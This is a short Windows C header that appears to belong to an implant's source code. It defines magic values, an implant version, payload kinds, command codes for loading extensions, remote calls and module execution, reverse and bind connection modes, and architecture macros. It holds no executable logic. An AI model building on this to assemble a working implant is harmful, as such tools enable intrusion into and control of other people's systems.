#include <Windows.h>
#define MAGIC_VALUE 0x7db7353f
#define RSA_MAGIC_VALUE 0x7db7353f
#define IMPLANT_VERSION 0x01000000
#define PAYLOAD_DLL 0x4
#define PAYLOAD_RAW 0x8
#define PAYLOAD_X64 0x8
#define PAYLOAD_X86 0x4

#define LOADEXTENSION 0x7c8d
#define REMOTECALL 0xbf1a
#define EXECUTEMODULE 0xdf9e

#define PAYLOAD_REVERSE 1
#define PAYLOAD_BIND	0

#if defined(__amd64__) || (__amd64) || (__x86_64__) || (__x86_64) || (_M_X64) || (_M_AMD64)
#define IMPLANT_ARCH 0x8 
#elif defined(i386) || defined(__i386__) || defined(__i386) || defined(_M_IX86) || defined(_M_X86)
#define IMPLANT_ARCH 0x4
#endif